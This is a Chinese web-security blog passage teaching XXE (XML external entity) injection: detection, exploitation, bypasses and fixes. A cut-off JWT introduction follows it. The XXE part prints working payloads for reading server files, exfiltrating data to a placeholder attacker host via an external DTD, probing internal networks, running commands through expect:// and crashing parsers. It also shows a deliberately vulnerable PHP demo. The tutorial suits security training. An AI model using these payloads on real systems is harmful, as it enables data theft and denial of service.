alt="20181120002647-e965b74c-ec17-1"></p><h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>XXE 漏洞发 生在<strong>应用程序解析 XML 输入时</strong>，没有禁止<strong>外部实体</strong>的加载，而外部实体的引用可支持http，file等协议，通过利用这些协议进行攻击。</p><p><img src="/../images/1270588-20200115235522292-2141935835.png" alt="img"></p><p><img src="/../images/20181120002647-e965b74c-ec17-1.png" alt="20181120002647-e965b74c-ec17-1"></p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><ul><li><p>数据包中的content-type</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">application/xml</span><br><span class="line">text/xml</span><br></pre></td></tr></table></figure></li><li><p>http body</p><p><img src="/../images/image-20230605180133052-1686034648311.png" alt="image-20230605180133052"></p></li><li><p>数据包请求头中Context-Type的值为application&#x2F;json，更改为application&#x2F;xml或者text&#x2F;xml，然后插入payload测试</p></li></ul><h3 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">simplexml_import_dom</span>()</span><br></pre></td></tr></table></figure><p>需要注意的是PHP是使用libxml来解析XML的，但是<strong>libxml2.9.0</strong>开始就默认不解析外部实体，自然就不存在xxe漏洞。</p><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilder</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.parsers.SAXParserFactory</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件读取</span><br><span class="line">内网探针</span><br><span class="line">拒绝服务攻击</span><br><span class="line">命令执行</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a> php版本</li><li>vulhub Apache solr XML 实体注入漏洞（CVE-2017-12629）</li></ul><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>Demo</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>username</code>为回显位</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; </span><br><span class="line">]&gt;                                                         </span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="外带"><a href="#外带" class="headerlink" title="外带"></a>外带</h4><p>php:&#x2F;&#x2F;filter读取对方服务器文件内容→引入外部实体（攻击服务器上的）→触发外部实体中的写入代码，将读取到的文件内容赋值给指定参数→接收参数，在攻击服务器监听或者查看日志，从而获取到对方服务器文件内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip:8000/test.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--test.dtd--&gt;</span><br><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://ip:8888/?data=%file;&#x27;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><blockquote><p>注意：test.dtd的内容，内部的%号要进行实体编码成&amp;#x25（因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>）</p></blockquote><p><img src="/../images/image-20230605192212337.png" alt="image-20230605192212337"></p><h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p><h5 id="引入服务器实体"><a href="#引入服务器实体" class="headerlink" title="引入服务器实体"></a>引入服务器实体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % xxe SYSTEM &quot;http://ip:8000/xml.dtd&quot;&gt; </span><br><span class="line">    %xxe;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--通过执行error实体，以便通过尝试加载不存在的文件来带出目标文件的值，从而生成包含不存在文件的名称的错误消息，该文件是/etc/passwd文件的内容--&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606142023880.png" alt="image-20230606142023880"></p><h5 id="引入本地系统文件–测试失败"><a href="#引入本地系统文件–测试失败" class="headerlink" title="引入本地系统文件–测试失败"></a>引入本地系统文件–测试失败</h5><p><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % SuperClass &#x27;</span><br><span class="line">         &gt;Your DTD code&lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>DTD code</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:/Windows/System32/wbem/xml/cim20.dtd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY % SuperClass &#x27;&gt;</span><br><span class="line">         &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;</span><br><span class="line">        &#x27;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ELEMENT message ANY&gt;</span><br><span class="line">    &lt;!ENTITY % para1 SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % para &#x27;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;para2;</span><br><span class="line">    &#x27;&gt;</span><br><span class="line">    %para;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605210541295.png" alt="image-20230605210541295"></p><p>不是所有的xml解析器都能解析嵌套参数实体</p><p><img src="/../images/image-20230606151226408.png" alt="image-20230606151226408"></p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;file:///文件路径&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!-- 使用php的filter过滤器读取含有xml保留字符的文件 --&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY  rabbit SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///e:/test.txt&quot;&gt;]&gt; </span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605193428910.png" alt="image-20230605193428910"></p><p>当不能使用过滤器时</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///f:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br></pre></td></tr></table></figure><p>evil.dtd</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p>POST数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- &amp;all是使用evil.dtd中的实体--&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;  </span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230605204320348.png" alt="image-20230605204320348"></p><h4 id="列目录–JAVA"><a href="#列目录–JAVA" class="headerlink" title="列目录–JAVA"></a>列目录–JAVA</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230607100242865.png" alt="image-20230607100242865"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Root / --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE aa[</span><br><span class="line">    &lt;!ELEMENT bb ANY&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;netdoc:///&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;&lt;/root&gt;</span><br></pre></td></tr></table></figure><h4 id="内网探针"><a href="#内网探针" class="headerlink" title="内网探针"></a>内网探针</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://内网ip:port&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br></pre></td></tr></table></figure><h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><blockquote><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://命令&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><h4 id="DOS攻击"><a href="#DOS攻击" class="headerlink" title="DOS攻击"></a>DOS攻击</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt; ]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; </span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>如果 XML 解析器尝试使用<code>/dev/random</code>文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。</p><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ul><li>phar协议反序列化</li><li><a href="https://xz.aliyun.com/t/3741">利用EXCEL进行XXE攻击</a></li><li>上传svg，docx等xml格式的文件进行攻击</li><li>java–jar协议解压压缩包</li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul><li><p>插入空格</p><p>可以在<code>&lt;?xml</code>或<code>&lt;!DOCTYPE</code>后插入任意数量的空格</p><p><img src="/../images/image-20230605205020027.png" alt="image-20230605205020027"></p></li><li><p>编码绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UTF-7</span><br><span class="line">UTF-16 BE，UTF-16 LE</span><br><span class="line">UTF-32 BE、UTF-32LE、UTF-322143、UTF-323412</span><br><span class="line">EBCDIC</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-7 &gt; payload.7.xml</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230606145117482.png" alt="image-20230606145117482"></p></li></ul><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">7.XXEinjector：一款功能强大的自动化XXE注射工具 - bmjoker - 博客园 (cnblogs.com)</a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁用外部实体</li></ul><p>PHP: </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>); </span><br></pre></td></tr></table></figure><p>JAVA: </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SAXBuilder</span></span><br><span class="line"><span class="type">SAXBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXBuilder</span>();</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">builder.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DocumentBuilder</span></span><br><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>  DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line"><span class="type">DocumentBuilder</span> <span class="variable">documentBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXReader</span></span><br><span class="line"><span class="type">SAXReader</span> <span class="variable">saxReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SAXReader</span>();</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">saxReader.setFeature(<span class="string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SAXTransformerFactory</span></span><br><span class="line"><span class="type">SAXTransformerFactory</span> <span class="variable">sf</span> <span class="operator">=</span> (SAXTransformerFactory) SAXTransformerFactory.newInstance();</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerFactory</span></span><br><span class="line"><span class="type">TransformerFactory</span> <span class="variable">tf</span> <span class="operator">=</span> TransformerFactory.newInstance();      </span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, <span class="string">&quot;&quot;</span>);</span><br><span class="line">tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unmarshaller 默认方法不存在xxe漏洞</span></span><br></pre></td></tr></table></figure><p> Python： </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><ul><li>过滤用户提交的 XML 数据</li></ul><p>如过滤关键词：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 和&lt;!ENTITY，或者 SYSTEM 和 PUBLIC</span><br></pre></td></tr></table></figure><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/3357">https://xz.aliyun.com/t/3357</a></p><p><a href="https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">https://r17a-17.github.io/2021/09/04/Java-XXE%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p><p><a href="https://xz.aliyun.com/t/6829#toc-4">https://xz.aliyun.com/t/6829#toc-4</a></p><p><strong>补充</strong>：<a href="https://tttang.com/archive/1813/#toc__2">https://tttang.com/archive/1813/#toc__2</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT安全</title>
      <link href="/2023/06/01/JWT%E4%BB%A4%E7%89%8C/"/>
      <url>/2023/06/01/JWT%E4%BB%A4%E7%89%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT认识"><a href="#JWT认识" class="headerlink" title="JWT认识"></a>JWT认识</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改。</p><h2 id="令牌工作流程"><a href="#令牌工作流程" class="headerlink" title="令牌工作流程"></a>令牌工作流程</h2><p><img src="/../images/jwt-diagram.png" alt="jwt"></p><ol><li>浏览器发起请求登陆</li><li>服务端验证身份，根据算法，将用户标识符打包生成 token, 并且返回给浏览器</li><li>浏览器发起请求获取用户资料，把刚刚拿到的 token 一起发送给服务器</li><li>服务器发现数据中有 token，验证签名并识别用户身份</li><li>服务器返回该用户的用户资料</li></ol><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。 </p><p><img src="/../images/jwt_token.png" alt="JWT"></p><p>hearder和Claims 的内容以 Base64URL 进行了编码。</p><blockquote><p>Base64URL  From 维基百科</p></blockquote><p><img src="/../images/image-20230607163309054.png" alt="image-20230607163309054"></p><h3 id="头部（Header）"><a href="#头部（Header）" class="headerlink" title="头部（Header）"></a>头部（Header）</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span><span class="string">&quot;webgoat_key&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>参数说明:</p><ul><li>algorithm（alg） :说明JWT签名使用的算法，常见有HS256（默认），RS256 等，也可以为 None不进行签名。</li><li>kid：用来指定验证签名的密钥</li><li>typ:说明这个 token 的类型为 JWT (可选参数)</li></ul><h3 id="声明（Claims）"><a href="#声明（Claims）" class="headerlink" title="声明（Claims）"></a>声明（Claims）</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"> <span 